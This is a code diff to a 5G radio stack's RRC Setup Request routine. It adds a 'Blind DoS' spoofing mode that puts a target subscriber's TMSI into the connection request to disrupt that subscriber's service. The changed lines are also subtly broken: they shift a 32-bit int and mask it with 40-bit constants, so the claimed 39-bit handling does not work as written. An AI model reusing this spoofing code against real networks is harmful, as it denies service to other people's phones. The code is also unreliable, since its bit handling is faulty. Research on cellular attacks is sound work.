@@ -841,16 +841,17 @@ uint8_t do_RRCSetupRequest(uint8_t Mod_id, uint8_t *buffer, size_t buffer_size, 
   rrcSetupRequest          = ul_ccch_msg.message.choice.c1->choice.rrcSetupRequest;
 
   if (tmsi_blind_dos_rrc /* != 0 */) {
-    int tmsi = tmsi_blind_dos_rrc;
+    int tmsi = tmsi_blind_dos_rrc << 1; // TMSI needs to be shifted because the TMSI buffer is 39 bits
     LOG_I(NR_RRC, "[Blind DoS] Spoofing attack, target TMSI: %d\n", tmsi);
     rrcSetupRequest->rrcSetupRequest.ue_Identity.present = NR_InitialUE_Identity_PR_ng_5G_S_TMSI_Part1;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.size = 1;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.size = 5;
     rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.bits_unused = 0;
     rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf = buf;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[0] = (tmsi & 0xff000000) >> 24;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[1] = (tmsi & 0x00ff0000) >> 16;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[2] = (tmsi & 0x0000ff00) >> 8;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[3] = (tmsi & 0x000000ff) >> 0;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[0] = (tmsi & 0xff00000000) >> 32;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[1] = (tmsi & 0x00ff000000) >> 24;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[2] = (tmsi & 0x0000ff0000) >> 16;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[3] = (tmsi & 0x000000ff00) >> 8;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[4] = (tmsi & 0x00000000ff) >> 0;
   }
   else if (1) {
     rrcSetupRequest->rrcSetupRequest.ue_Identity.present = NR_InitialUE_Identity_PR_randomValue;
